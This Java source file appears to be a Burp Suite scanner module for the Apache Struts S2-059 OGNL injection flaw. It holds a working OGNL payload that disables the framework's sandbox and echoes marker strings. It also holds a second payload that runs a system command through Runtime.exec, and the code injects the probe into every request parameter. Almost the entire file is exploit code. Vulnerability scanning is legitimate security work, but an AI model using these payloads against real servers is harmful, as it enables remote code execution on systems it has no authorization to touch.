package module;

import burp.IModule;
import burp.IParameter;
import burp.IScanIssue;

import java.net.URLEncoder;
import java.util.List;

public class S2_059 extends IModule {
    public S2_059() {
        poc =
            "%{" +
            "(#context=#attr['struts.valueStack'].context)" +
            ".(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" +
            ".(#ognlUtil.setExcludedClasses(''))" +
            ".(#ognlUtil.setExcludedPackageNames(''))" +
            ".(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))" +
            ".(#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'))" +
            ".(#res.getWriter().print('"+ injectMark[0] +"'))" +
            ".(#res.getWriter().print('"+ injectMark[1] +"'))" +
            ".(#res.getWriter().flush())" +
            ".(#res.getWriter().close())}";
        poc = URLEncoder.encode(poc);

        exp =
            "%{" +
            "(#context=#attr['struts.valueStack'].context)" +
            ".(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" +
            ".(#ognlUtil.setExcludedClasses(''))" +
            ".(#ognlUtil.setExcludedPackageNames(''))" +
            ".(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))" +
            ".(@java.lang.Runtime@getRuntime()" +
            ".exec('touch /tmp/success'))" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), poc, parameter.getType());
                request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                if (check()) {
                    this.detail = exp;
                    return creatCustomScanIssue();
                }
            }
        }
        return super.start();
    }
}
